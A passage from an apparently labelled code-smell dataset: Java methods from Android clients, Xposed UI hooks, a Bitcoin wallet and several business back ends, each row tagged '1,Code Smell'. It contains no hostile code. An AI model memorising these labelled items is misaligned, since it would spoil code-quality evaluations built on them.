  for (  TopicDeployEntity entity : storedTopicDeployMap.values()) {
    if (entity.getTopicName().equals(TServerConstants.OFFSET_HISTORY_NAME)) {
      continue;
    }
    srcTopicSet.add(entity.getRecordKey());
  }
  Set<String> tgtTopicSet=new HashSet<>();
  for (  TopicDeployEntity entity : topicDeployMap.values()) {
    if (entity.getTopicName().equals(TServerConstants.OFFSET_HISTORY_NAME)) {
      continue;
    }
    tgtTopicSet.add(entity.getRecordKey());
  }
  if (srcTopicSet.size() != tgtTopicSet.size()) {
    logger.error(""  verify failure, stored topic-deploy configurations size not equal!"");
    return false;
  }
  for (  Map.Entry<String,TopicDeployEntity> qryEntry : storedTopicDeployMap.entrySet()) {
    TopicDeployEntity targetEntity=topicDeployMap.get(qryEntry.getKey());
    if (targetEntity == null) {
      logger.error(strBuff.append(""  verify failure, stored topic-deploy value not equal!"").append("" data in server is "").append(qryEntry.getValue().toString()).append("", data stored is null!"").toString());
      return false;
    }
    if ((targetEntity.getTopicName().equals(TServerConstants.OFFSET_HISTORY_NAME) && (!targetEntity.isMatched(qryEntry.getValue(),false))) || (!targetEntity.getTopicName().equals(TServerConstants.OFFSET_HISTORY_NAME) && !targetEntity.isDataEquals(qryEntry.getValue()))) {
      logger.error(strBuff.append(""  verify failure, stored topic-deploy value not equal!"").append("" data in server is "").append(qryEntry.getValue().toString()).append("", data stored is "").append(targetEntity).toString());
      return false;
    }
  }
  logger.info(""[Recovery Topic Deploy] end, success!"");
  return true;
}",1,Code Smell
"public static void checkRestrictedInviteUsers(int currentAccount,TLRPC.Chat currentChat,TLRPC.TL_messages_invitedUsers invitedUsers){
  if (invitedUsers == null || invitedUsers.missing_invitees.isEmpty() || currentChat == null) {
    return;
  }
  ArrayList<TLRPC.User> users=new ArrayList<>();
  ArrayList<Long> pmLockedUsers=new ArrayList<>();
  ArrayList<Long> inviteLockedUsers=new ArrayList<>();
  for (  TLRPC.TL_missingInvitee missing_invitee : invitedUsers.missing_invitees) {
    TLRPC.User user=null;
    if (invitedUsers.updates != null) {
      for (int i=0; i < invitedUsers.updates.users.size(); ++i) {
        TLRPC.User u=invitedUsers.updates.users.get(i);
        if (u.id == missing_invitee.user_id) {
          user=u;
          break;
        }
      }
    }
    if (user == null) {
      user=MessagesController.getInstance(currentAccount).getUser(missing_invitee.user_id);
    }
    if (user == null) {
      continue;
    }
    users.add(user);
    if (missing_invitee.premium_required_for_pm) {
      pmLockedUsers.add(user.id);
    }
    if (missing_invitee.premium_would_allow_invite) {
      inviteLockedUsers.add(user.id);
    }
  }
  if (users.isEmpty())   return;
  AndroidUtilities.runOnUIThread(() -> {
    if (!LaunchActivity.isActive)     return;
    BaseFragment lastFragment=LaunchActivity.getLastFragment();
    if (lastFragment != null && lastFragment.getParentActivity() != null) {
      LimitReachedBottomSheet restrictedUsersBottomSheet=new LimitReachedBottomSheet(lastFragment,lastFragment.getParentActivity(),LimitReachedBottomSheet.TYPE_ADD_MEMBERS_RESTRICTED,currentAccount,null);
      restrictedUsersBottomSheet.setRestrictedUsers(currentChat,users,pmLockedUsers,inviteLockedUsers);
      restrictedUsersBottomSheet.show();
    }
  }
,200);
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  Object mStatusBarViewTouchEventHandler=getObjectField(param.thisObject,""mStatusBarViewTouchEventHandler"");
  mGestureDetector=new GestureDetector(mContext,new LongpressListener(true));
  hookAllMethods(mStatusBarViewTouchEventHandler.getClass(),""handleTouchEvent"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param1) throws Throwable {
      MotionEvent event=(MotionEvent)param1.args[0];
      mGestureDetector.onTouchEvent(event);
      if (!oneFingerPulldownEnabled)       return;
      int mBarState=(int)getObjectField(param.thisObject,""mBarState"");
      if (mBarState != STATUSBAR_MODE_SHADE)       return;
      int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
      float x=event.getX();
      float region=w * statusbarPortion;
      boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
      if (pullDownApproved) {
        callMethod(param.thisObject,""expandWithQs"");
      }
    }
  }
);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  hookAllMethods(param.getResult().getClass(),""onTouch"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param1) throws Throwable {
      MotionEvent event=(MotionEvent)param1.args[1];
      mGestureDetector.onTouchEvent(event);
      if (!oneFingerPulldownEnabled)       return;
      if (!(boolean)getObjectField(param.thisObject,""mPulsing"") && !(boolean)getObjectField(param.thisObject,""mDozing"") && (int)getObjectField(param.thisObject,""mBarState"") == STATUSBAR_MODE_SHADE && (boolean)callMethod(param.thisObject,""isFullyCollapsed"")) {
        int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
        float x=event.getX();
        float region=w * statusbarPortion;
        boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
        if (pullDownApproved) {
          callMethod(param.thisObject,""expandWithQs"");
        }
      }
    }
  }
);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  NotificationPanelViewController=param.thisObject;
  Object mTouchHandler=getObjectField(param.thisObject,""mTouchHandler"");
  GestureDetector pullUpDetector=new GestureDetector(mContext,getPullUpListener());
  hookAllMethods(mTouchHandler.getClass(),""onTouchEvent"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param) throws Throwable {
      if (oneFingerPullupEnabled && STATUSBAR_MODE_KEYGUARD != (int)getObjectField(NotificationPanelViewController,""mBarState"")) {
        pullUpDetector.onTouchEvent((MotionEvent)param.args[0]);
      }
    }
  }
);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (!oneFingerPulldownEnabled)   return;
  MotionEvent event=param.args[0] instanceof MotionEvent ? (MotionEvent)param.args[0] : (MotionEvent)param.args[1];
  mGestureDetector.onTouchEvent(event);
}",1,Code Smell
"public static void showOpenUrlAlert(BaseFragment fragment,String url,boolean punycode,boolean ask){
  showOpenUrlAlert(fragment,url,punycode,true,ask,false,null,null);
}
public static void showOpenUrlAlert(BaseFragment fragment,String url,boolean punycode,boolean tryTelegraph,boolean ask){
  showOpenUrlAlert(fragment,url,punycode,tryTelegraph,ask,null,null);
}
public static void showOpenUrlAlert(BaseFragment fragment,String url,boolean punycode,boolean ask,Theme.ResourcesProvider resourcesProvider){
  showOpenUrlAlert(fragment,url,punycode,true,ask,false,null,resourcesProvider);
}
public static void showOpenUrlAlert(BaseFragment fragment,String url,boolean punycode,boolean tryTelegraph,boolean ask,Browser.Progress progress,Theme.ResourcesProvider resourcesProvider){
  showOpenUrlAlert(fragment,url,punycode,tryTelegraph,ask,false,progress,resourcesProvider);
}
public static void showOpenUrlAlert(BaseFragment fragment,String url,boolean punycode,boolean tryTelegraph,boolean ask,boolean forceNotInternalForApps,Browser.Progress progress,Theme.ResourcesProvider resourcesProvider){
  if (fragment == null || fragment.getParentActivity() == null) {
    return;
  }
  long inlineReturn=(fragment instanceof ChatActivity) ? ((ChatActivity)fragment).getInlineReturn() : 0;
  if (Browser.isInternalUrl(url,null) || !ask || NekoConfig.skipOpenLinkConfirm.Bool()) {
    Browser.openUrl(fragment.getParentActivity(),Uri.parse(url),inlineReturn == 0,tryTelegraph,forceNotInternalForApps && checkInternalBotApp(url),progress);
  }
 else {
    String urlFinal=url;
    Runnable open=() -> Browser.openUrl(fragment.getParentActivity(),Uri.parse(url),inlineReturn == 0,tryTelegraph,progress);
    AlertDialog.Builder builder=new AlertDialog.Builder(fragment.getParentActivity(),resourcesProvider);
    builder.setTitle(LocaleController.getString(""OpenUrlTitle"",R.string.OpenUrlTitle));
    AlertDialog[] dialog=new AlertDialog[1];
    SpannableString link=new SpannableString(urlFinal);
    link.setSpan(new URLSpan(urlFinal){
      @Override public void onClick(      View widget){
        open.run();
        if (dialog[0] != null) {
          dialog[0].dismiss();
        }
      }
    }
,0,link.length(),Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
    SpannableStringBuilder stringBuilder=new SpannableStringBuilder(LocaleController.getString(""OpenUrlAlert2"",R.string.OpenUrlAlert2));
    int index=stringBuilder.toString().indexOf(""%1$s"");
    if (index >= 0) {
      stringBuilder.replace(index,index + 4,link);
    }
    builder.setMessage(stringBuilder);
    builder.setMessageTextViewClickable(false);
    builder.setPositiveButton(LocaleController.getString(""Open"",R.string.Open),(dialogInterface,i) -> open.run());
    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
    builder.setNeutralButton(LocaleController.getString(""Copy"",R.string.Copy),(dialogInterface,i) -> {
      try {
        AndroidUtilities.addToClipboard(url);
        Toast.makeText(fragment.getParentActivity(),LocaleController.getString(""LinkCopied"",R.string.LinkCopied),Toast.LENGTH_SHORT).show();
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
);
    fragment.showDialog(dialog[0]=builder.create());
  }
}",1,Code Smell
"/** 
 * Delta uses LogicalRelation's HadoopFsRelation as a logical plan's leaf. It implements FileIndex using TahoeLogFileIndex that contains DeltaLog, which can be used to get dataset's snapshot.
 */
public static Optional<String> extractVersionFromLogicalRelation(LogicalRelation logicalRelation){
  if (logicalRelation.relation() instanceof HadoopFsRelation) {
    HadoopFsRelation fsRelation=(HadoopFsRelation)logicalRelation.relation();
    asJavaOptional(logicalRelation.catalogTable());
    if (logicalRelation.catalogTable().isDefined() && logicalRelation.catalogTable().get().provider().isDefined() && DELTA.equalsIgnoreCase(logicalRelation.catalogTable().get().provider().get())) {
      if (hasDeltaClasses() && fsRelation.location() instanceof TahoeLogFileIndex) {
        TahoeLogFileIndex fileIndex=(TahoeLogFileIndex)fsRelation.location();
        return Optional.of(Long.toString(fileIndex.getSnapshot().version()));
      }
    }
  }
  return Optional.empty();
}
",1,Code Smell
"public void openRepost(SourceView sourceView,StoryEntry entry){
  if (isShown) {
    return;
  }
  prepareClosing=false;
  forceBackgroundVisible=false;
  if (windowManager != null && windowView != null && windowView.getParent() == null) {
    windowManager.addView(windowView,windowLayoutParams);
  }
  outputEntry=entry;
  StoryPrivacySelector.applySaved(currentAccount,outputEntry);
  isVideo=outputEntry != null && outputEntry.isVideo;
  videoTextureHolder.active=isVideo;
  if (sourceView != null) {
    fromSourceView=sourceView;
    openType=sourceView.type;
    fromRect.set(sourceView.screenRect);
    fromRounding=sourceView.rounding;
    fromSourceView.hide();
  }
 else {
    openType=0;
    fromRect.set(0,dp(100),AndroidUtilities.displaySize.x,dp(100) + AndroidUtilities.displaySize.y);
    fromRounding=dp(8);
  }
  containerView.updateBackground();
  previewContainer.setBackgroundColor(openType == 1 || openType == 0 ? 0 : 0xff1f1f1f);
  containerView.setTranslationX(0);
  containerView.setTranslationY(0);
  containerView.setTranslationY2(0);
  containerView.setScaleX(1f);
  containerView.setScaleY(1f);
  dismissProgress=0;
  AndroidUtilities.lockOrientation(activity,ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
  if (outputEntry != null) {
    captionEdit.setText(outputEntry.caption);
  }
  previewButtons.appear(true,false);
  navigateTo(PAGE_PREVIEW,false);
  switchToEditMode(EDIT_MODE_NONE,false);
  animateOpenTo(1,true,this::onOpenDone);
  addNotificationObservers();
}",1,Code Smell
"private void discoverWallet(){
  discoverButton.setDisable(true);
  discoverButton.setMaxHeight(discoverButton.getHeight());
  ProgressIndicator progressIndicator=new ProgressIndicator(0);
  progressIndicator.getStyleClass().add(""button-progress"");
  discoverButton.setGraphic(progressIndicator);
  List<Wallet> wallets=new ArrayList<>();
  List<List<ChildNumber>> derivations=ScriptType.getScriptTypesForPolicyType(PolicyType.SINGLE).stream().map(ScriptType::getDefaultDerivation).collect(Collectors.toList());
  derivations.add(List.of(new ChildNumber(0,true)));
  derivations.add(ScriptType.P2PKH.getDefaultDerivation(1));
  for (  ScriptType scriptType : ScriptType.getScriptTypesForPolicyType(PolicyType.SINGLE)) {
    for (    List<ChildNumber> derivation : derivations) {
      try {
        Wallet wallet=getWallet(scriptType,derivation);
        wallets.add(wallet);
      }
 catch (      ImportException e) {
        String errorMessage=e.getMessage();
        if (e.getCause() instanceof MnemonicException.MnemonicChecksumException) {
          errorMessage=""Invalid word list - checksum incorrect"";
        }
 else         if (e.getCause() != null && e.getCause().getMessage() != null && !e.getCause().getMessage().isEmpty()) {
          errorMessage=e.getCause().getMessage();
        }
        setError(""Import Error"",errorMessage + ""."");
        discoverButton.setDisable(!AppServices.isConnected());
      }
    }
  }
  ElectrumServer.WalletDiscoveryService walletDiscoveryService=new ElectrumServer.WalletDiscoveryService(wallets);
  progressIndicator.progressProperty().bind(walletDiscoveryService.progressProperty());
  walletDiscoveryService.setOnSucceeded(successEvent -> {
    discoverButton.setGraphic(null);
    Optional<Wallet> optWallet=walletDiscoveryService.getValue();
    if (optWallet.isPresent()) {
      EventManager.get().post(new WalletImportEvent(optWallet.get()));
    }
 else {
      discoverButton.setDisable(false);
      Optional<ButtonType> optButtonType=AppServices.showErrorDialog(""No existing wallet found"",Config.get().getServerType() == ServerType.BITCOIN_CORE ? ""The configured server type is Bitcoin Core, which does not support wallet discovery.\n\n"" + ""You can however import this wallet and scan the blockchain by supplying a start date. Do you want to import this wallet?"" : ""Could not find a wallet with existing transactions using this mnemonic. Import this wallet anyway?"",ButtonType.NO,ButtonType.YES);
      if (optButtonType.isPresent() && optButtonType.get() == ButtonType.YES) {
        setContent(getScriptTypeEntry());
        setExpanded(true);
      }
    }
  }
);
  walletDiscoveryService.setOnFailed(failedEvent -> {
    discoverButton.setGraphic(null);
    log.error(""Failed to discover wallets"",failedEvent.getSource().getException());
    setError(""Failed to discover wallets"",failedEvent.getSource().getException().getMessage());
  }
);
  walletDiscoveryService.start();
}",1,Code Smell
"@Override public void onDragEnd(float velocity){
  if (!allowDragging()) {
    return;
  }
  stickersDragging=false;
  if ((wasExpanded && velocity >= AndroidUtilities.dp(200)) || (!wasExpanded && velocity <= AndroidUtilities.dp(-200)) || (wasExpanded && stickersExpansionProgress <= 0.6f)|| (!wasExpanded && stickersExpansionProgress >= 0.4f)) {
    setStickersExpanded(!wasExpanded,true,true);
  }
 else {
    setStickersExpanded(wasExpanded,true,true);
  }
}",1,Code Smell
"@Override @Transactional public String cancelOrder(String orderNo,Long userId){
  NewBeeMallOrder newBeeMallOrder=newBeeMallOrderMapper.selectByOrderNo(orderNo);
  if (newBeeMallOrder != null) {
    if (!userId.equals(newBeeMallOrder.getUserId())) {
      NewBeeMallException.fail(ServiceResultEnum.NO_PERMISSION_ERROR.getResult());
    }
    if (newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_SUCCESS.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_MALLUSER.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_EXPIRED.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_JUDGE.getOrderStatus()) {
      return ServiceResultEnum.ORDER_STATUS_ERROR.getResult();
    }
    if (newBeeMallOrderMapper.closeOrder(Collections.singletonList(newBeeMallOrder.getOrderId()),NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_MALLUSER.getOrderStatus()) > 0 && recoverStockNum(Collections.singletonList(newBeeMallOrder.getOrderId()))) {
      return ServiceResultEnum.SUCCESS.getResult();
    }
 else {
      return ServiceResultEnum.DB_ERROR.getResult();
    }
  }
  return ServiceResultEnum.ORDER_NOT_EXIST_ERROR.getResult();
}",1,Code Smell
"@NonNull @Override public FragmentTransaction setPrimaryNavigationFragment(@Nullable Fragment fragment){
  if (fragment != null && fragment.mFragmentManager != null && fragment.mFragmentManager != mManager) {
    throw new IllegalStateException(""Cannot setPrimaryNavigation for Fragment attached to "" + ""a different FragmentManager. Fragment "" + fragment.toString() + "" is already""+ "" attached to a FragmentManager."");
  }
  return super.setPrimaryNavigationFragment(fragment);
}
",1,Code Smell
"private List<BaseTree<DeviceChannel>> transportChannelsToTree(List<DeviceChannel> channels,String parentId){
  if (channels == null) {
    return null;
  }
  List<BaseTree<DeviceChannel>> treeNotes=new ArrayList<>();
  if (channels.size() == 0) {
    return treeNotes;
  }
  for (  DeviceChannel channel : channels) {
    BaseTree<DeviceChannel> node=new BaseTree<>();
    node.setId(channel.getChannelId());
    node.setDeviceId(channel.getDeviceId());
    node.setName(channel.getName());
    node.setPid(parentId);
    node.setBasicData(channel);
    node.setParent(false);
    if (channel.getChannelId().length() <= 8) {
      node.setParent(true);
    }
 else {
      if (channel.getChannelId().length() != 20) {
        node.setParent(channel.getParental() == 1);
      }
 else {
        try {
          int type=Integer.parseInt(channel.getChannelId().substring(10,13));
          if (type == 215 || type == 216 || type == 200) {
            node.setParent(true);
          }
        }
 catch (        NumberFormatException e) {
          node.setParent(false);
        }
      }
    }
    treeNotes.add(node);
  }
  Collections.sort(treeNotes);
  return treeNotes;
}",1,Code Smell
"@Override public Object assembleMockResponse(BeforeEvent event,Invocation invocation){
  if (StringUtils.isNotBlank(invocation.getResponseType()) && SET_FORM_LIST.contains(invocation.getResponseType()) && invocation.getResponse() instanceof List) {
    try {
      Class c=Class.forName(""redis.clients.jedis.BinaryJedis$SetFromList"");
      Constructor constructor=c.getDeclaredConstructors()[0];
      constructor.setAccessible(true);
      return constructor.newInstance(invocation.getResponse());
    }
 catch (    Throwable e) {
      log.error(""assembleMockResponse Throwable."",e);
    }
  }
  return invocation.getResponse();
}",1,Code Smell
"@Override public Integer RequestTimeOut(){
  Integer frontTimeOut=60;
  List<SettingItemVO> settingItemVOS=queryBasicSetting();
  for (int i=0; i < settingItemVOS.size(); i++) {
    SettingItemVO settingItemVO=settingItemVOS.get(i);
    if (StringUtils.isNotBlank(settingItemVO.getPkey()) && settingItemVO.getPkey().equalsIgnoreCase(XpackSettingConstants.Front_Time_Out) && StringUtils.isNotBlank(settingItemVO.getPval())) {
      frontTimeOut=Integer.parseInt(settingItemVO.getPval());
    }
  }
  return frontTimeOut;
}",1,Code Smell
"private void updateGradient(){
  if (!attachedToWindow) {
    return;
  }
  if (getMeasuredHeight() != 0 && getMeasuredWidth() != 0) {
    int c1=currentColor;
    int c2;
    Color.colorToHSV(c1,colorFloat);
    colorFloat[1]*=locked ? 2 : 1;
    if (colorFloat[2] > 0.7f) {
      colorFloat[2]=0.7f;
    }
    int baseColor=Color.HSVToColor(colorFloat);
    c2=ColorUtils.blendARGB(baseColor,Theme.getColor(Theme.key_windowBackgroundWhite,resourcesProvider),0.5f);
    c1=ColorUtils.blendARGB(baseColor,Theme.getColor(Theme.key_windowBackgroundWhite,resourcesProvider),0.4f);
    if (shader == null || color1 != c1 || color2 != c2) {
      if (wasDrawn) {
        oldShaderPaint=paint;
        oldShaderPaint.setAlpha(255);
        shaderCrossfadeProgress=0;
      }
      paint=new Paint(Paint.ANTI_ALIAS_FLAG);
      shader=new LinearGradient(0,getMeasuredHeight(),0,0,new int[]{color1=c1,color2=c2},null,Shader.TileMode.CLAMP);
      paint.setShader(shader);
      invalidate();
    }
  }
}",1,Code Smell
"@Override public boolean initOnce() throws Exception {
  boolean isSuccess=true;
  if (QAppUtils.isQQnt()) {
    isSuccess=nativeInitNtKernelRecallMsgHook();
  }
  Method revokeMsg=null;
  for (  Method m : _QQMessageFacade().getDeclaredMethods()) {
    if (m.getReturnType().equals(void.class)) {
      Class<?>[] argt=m.getParameterTypes();
      if (argt.length == 2 && argt[0].equals(ArrayList.class) && argt[1].equals(boolean.class)) {
        revokeMsg=m;
        break;
      }
    }
  }
  HookUtils.hookBeforeIfEnabled(this,revokeMsg,-10086,param -> {
    mQQMsgFacade=param.thisObject;
    ArrayList<?> list=(ArrayList<?>)param.args[0];
    param.setResult(null);
    if (list == null || list.isEmpty()) {
      return;
    }
    for (    Object revokeMsgInfo : list) {
      try {
        onRevokeMsgLegacy(revokeMsgInfo);
      }
 catch (      Exception|LinkageError|AssertionError t) {
        traceError(t);
      }
    }
    list.clear();
  }
);
  return isSuccess;
}",1,Code Smell
"@Override public void init(){
  mWallpaperUtilsCls=XposedHelpers.findClassIfExists(""com.miui.home.launcher.WallpaperUtils"",lpparam.classLoader);
  MethodHook hook=new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      View folder=(View)param.thisObject;
      new Thread(() -> {
        try {
          Context context=folder.getContext();
          int opt=Integer.parseInt(PrefsUtils.getSharedStringPrefs(context,""prefs_key_home_folder_shade"",""0""));
          int level=PrefsUtils.getSharedIntPrefs(context,""prefs_key_home_folder_shade_level"",40);
          if (mWallpaperUtilsCls != null) {
            try {
              isLight=(boolean)XposedHelpers.callStaticMethod(mWallpaperUtilsCls,""hasAppliedLightWallpaper"");
            }
 catch (            Throwable tr) {
              logW(TAG,""isLight is abnormal"",tr);
            }
          }
          Drawable bkg;
          if (opt == 1) {
            int bgColor=(isLight ? 0x00ffffff : 0x00000000) | (Math.round(255 * level / 100f) * 0x1000000);
            bkg=new ColorDrawable(bgColor);
          }
 else           if (opt == 2) {
            bkg=getPaintDrawable(level);
          }
 else {
            bkg=null;
          }
          new Handler(context.getMainLooper()).post(() -> {
            XposedInit.mPrefsMap.put(""prefs_key_home_folder_shade"",String.valueOf(opt));
            XposedInit.mPrefsMap.put(""prefs_key_home_folder_shade_level"",level);
            folder.setBackground(bkg);
          }
);
        }
 catch (        Throwable t) {
          logW(TAG,"""",t);
        }
      }
).start();
    }
  }
;
  hookAllConstructors(""com.miui.home.launcher.FolderCling"",hook);
  findAndHookMethod(""com.miui.home.launcher.FolderCling"",""onWallpaperColorChanged"",hook);
  findAndHookMethod(""com.miui.home.launcher.FolderCling"",""updateLayout"",boolean.class,hook);
  findAndHookMethod(""com.miui.home.launcher.Folder"",""setBackgroundAlpha"",float.class,new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      int opt=mPrefsMap.getStringAsInt(""home_folder_shade"",0);
      Object mLauncher=XposedHelpers.getObjectField(param.thisObject,""mLauncher"");
      View folderCling=(View)XposedHelpers.callMethod(mLauncher,""getFolderCling"");
      if (opt == 1 || mLauncher == null || folderCling == null)       return;
      Drawable bkg=folderCling.getBackground();
      if (bkg != null)       bkg.setAlpha(Math.round((float)param.args[0] * 255));
    }
  }
);
}",1,Code Smell
"public void open(final CameraSession session,final SurfaceTexture texture,final Runnable callback,final Runnable prestartCallback){
  if (session == null || texture == null) {
    return;
  }
  threadPool.execute(() -> {
    Camera camera=session.cameraInfo.camera;
    try {
      if (camera == null) {
        camera=session.cameraInfo.camera=Camera.open(session.cameraInfo.cameraId);
      }
      Camera.Parameters params=camera.getParameters();
      List<String> rawFlashModes=params.getSupportedFlashModes();
      availableFlashModes.clear();
      if (rawFlashModes != null) {
        for (int a=0; a < rawFlashModes.size(); a++) {
          String rawFlashMode=rawFlashModes.get(a);
          if (rawFlashMode.equals(Camera.Parameters.FLASH_MODE_OFF) || rawFlashMode.equals(Camera.Parameters.FLASH_MODE_ON) || rawFlashMode.equals(Camera.Parameters.FLASH_MODE_AUTO)) {
            availableFlashModes.add(rawFlashMode);
          }
        }
        session.checkFlashMode(availableFlashModes.get(0));
      }
      if (prestartCallback != null) {
        prestartCallback.run();
      }
      session.configurePhotoCamera();
      camera.setPreviewTexture(texture);
      camera.startPreview();
      if (callback != null) {
        AndroidUtilities.runOnUIThread(callback);
      }
    }
 catch (    Exception e) {
      session.cameraInfo.camera=null;
      if (camera != null) {
        camera.release();
      }
      FileLog.e(e);
    }
  }
);
}",1,Code Smell
"@Override public QueryAttendanceEmpDetailVO queryAttendEmpMonthStatusDetail(QueryAttendanceEmpDetailBO queryAttendanceEmpDetailBO){
  QueryAttendanceEmpDetailVO queryAttendanceEmpDetailVO=new QueryAttendanceEmpDetailVO();
  Calendar cal=Calendar.getInstance();
  cal.set(Calendar.YEAR,queryAttendanceEmpDetailBO.getYear());
  cal.set(Calendar.MONTH,queryAttendanceEmpDetailBO.getMonth() - 1);
  queryAttendanceEmpDetailVO.setStartTime(LocalDateTimeUtil.of(cal.getTime()).with(TemporalAdjusters.firstDayOfMonth()).toLocalDate());
  queryAttendanceEmpDetailVO.setEndTime(LocalDateTimeUtil.of(cal.getTime()).with(TemporalAdjusters.lastDayOfMonth()).toLocalDate());
  List<String> dates=findDates(queryAttendanceEmpDetailVO.getStartTime(),queryAttendanceEmpDetailVO.getEndTime());
  List<Map<String,Object>> monthMapList=new ArrayList<>();
  List<Long> employeeIds=ListUtil.toList(queryAttendanceEmpDetailBO.getEmployeeId());
  LocalDateTime startDateTime=queryAttendanceEmpDetailVO.getStartTime().atStartOfDay();
  LocalDateTime endDateTime=LocalDateTimeUtil.endOfDay(queryAttendanceEmpDetailVO.getEndTime().atStartOfDay());
  List<HrmAttendanceClock> startClockList=queryAttendanceClockList(ClockType.GO_TO.getValue(),startDateTime,endDateTime,employeeIds,ONE);
  List<HrmAttendanceClock> endClockList=queryAttendanceClockList(ClockType.GET_OFF.getValue(),startDateTime,endDateTime,employeeIds,ONE);
  HrmAttendanceGroup hrmAttendanceGroup=attendanceGroupService.queryAttendanceGroup(queryAttendanceEmpDetailBO.getEmployeeId());
  Map<String,Map<String,Object>> empRecordDetailMap=queryAttendanceEmpRecordDetailByDate(startClockList,endClockList,dates,hrmAttendanceGroup,queryAttendanceEmpDetailBO.getEmployeeId());
  Integer empStatus=ZERO;
  for (  String date : dates) {
    Map<String,Object> mapList=new HashMap<>();
    Map<String,Object> map=empRecordDetailMap.get(date);
    Integer status=(Integer)map.get(""status"");
    if (status.equals(AttendanceResultEnum.NORMAL.getValue())) {
      if ((Integer)map.get(""lateCount"") > ZERO || (Integer)map.get(""earlyCount"") > ZERO || (Integer)map.get(""IsOutCard"") > ZERO) {
        empStatus=ONE;
      }
    }
 else     if (status.equals(AttendanceResultEnum.ABSENTEEISM.getValue())) {
      empStatus=ONE;
    }
    mapList.put(date,empStatus);
    monthMapList.add(mapList);
  }
  queryAttendanceEmpDetailVO.setDateList(monthMapList);
  return queryAttendanceEmpDetailVO;
}",1,Code Smell
"/** 
 * 鑾峰彇鎸囧畾access_token 杩斿洖access_token鎴朜ot_Login
 */
@GetMapping(""/token/access_token"") public Result getSimplyAccessToken(@RequestParam(""password"") String password,@RequestParam(""tokenName"") String tokenName){
  systemSetting systemSetting=systemService.selectSetting();
  if (!systemSetting.getIsGetToken()) {
    return Result.error(""Not_Open"");
  }
  if (password.equals(systemSetting.getGetTokenPassword())) {
    for (    token token : apiService.selectToken("""")) {
      if (token.getName().equals(tokenName)) {
        if (token.getAccess_token() != null) {
          return Result.success(token.getAccess_token());
        }
        return Result.error(""璇okenName娌℃湁瀛樻斁Access_Token"");
      }
    }
    return Result.error(""鏈壘鍒拌tokenName锛�"");
  }
 else {
    return Result.error(""Not_Login"");
  }
}
",1,Code Smell
"private static String handleWhere(PlainSelect plainSelect,Select statementSelect,String dsType) throws Exception {
  Expression expr=plainSelect.getWhere();
  if (expr == null) {
    return handleWith(plainSelect,statementSelect,dsType);
  }
  StringBuilder stringBuilder=new StringBuilder();
  BinaryExpression binaryExpression=null;
  try {
    binaryExpression=(BinaryExpression)expr;
  }
 catch (  Exception e) {
  }
  if (binaryExpression != null) {
    boolean hasSubBinaryExpression=binaryExpression instanceof AndExpression || binaryExpression instanceof OrExpression;
    if (!hasSubBinaryExpression && !(binaryExpression.getLeftExpression() instanceof BinaryExpression) && !(binaryExpression.getLeftExpression() instanceof InExpression)&& (hasVariable(binaryExpression.getLeftExpression().toString()) || hasVariable(binaryExpression.getRightExpression().toString()))) {
      stringBuilder.append(SubstitutedSql);
    }
 else {
      expr.accept(getExpressionDeParser(stringBuilder));
    }
  }
 else {
    expr.accept(getExpressionDeParser(stringBuilder));
  }
  plainSelect.setWhere(CCJSqlParserUtil.parseCondExpression(stringBuilder.toString()));
  return handleWith(plainSelect,statementSelect,dsType);
}
",1,Code Smell
"private void subscribeNotification(@NotNull Project project,Disposable tempDisposable){
  project.getMessageBus().connect(tempDisposable).subscribe(Notifications.TOPIC,new NotificationsAdapter(){
    boolean hasSync=false;
    @Override public void notify(    @NotNull Notification notification){
      if (!hasSync && ""gradle sync"".equalsIgnoreCase(notification.getGroupId()) && notification.getContent() != null && (notification.getContent().toLowerCase().contains(""gradle sync finished"") || notification.getContent().toLowerCase().contains(""gradle sync failed""))) {
        onSyncFinish(project);
      }
    }
  }
);
}
",1,Code Smell
"@Override public Label getLabel(){
  if (getWalletTransaction() != null) {
    List<WalletTransaction.Output> outputs=getWalletTransaction().getOutputs();
    if (getIndex() < outputs.size()) {
      WalletTransaction.Output output=outputs.get(getIndex());
      if (output instanceof WalletTransaction.NonAddressOutput) {
        List<ScriptChunk> chunks=output.getTransactionOutput().getScript().getChunks();
        if (!chunks.isEmpty() && chunks.get(0).isOpCode() && chunks.get(0).getOpcode() == ScriptOpCodes.OP_RETURN) {
          return new Label(chunks.get(0).toString(),GlyphUtils.getOpcodeGlyph());
        }
 else {
          return new Label(""Output #"" + getIndex(),GlyphUtils.getOpcodeGlyph());
        }
      }
 else       if (output instanceof WalletTransaction.PaymentOutput) {
        Payment payment=paymentOutput.getPayment();
        return new Label(payment.getLabel() != null && payment.getType() != Payment.Type.FAKE_MIX && payment.getType() != Payment.Type.MIX ? payment.getLabel() : payment.getAddress().toString(),GlyphUtils.getOutputGlyph(getWalletTransaction(),payment));
      }
 else       if (output instanceof WalletTransaction.ChangeOutput) {
        return new Label(""Change"",GlyphUtils.getChangeGlyph());
      }
    }
  }
  return super.getLabel();
}",1,Code Smell
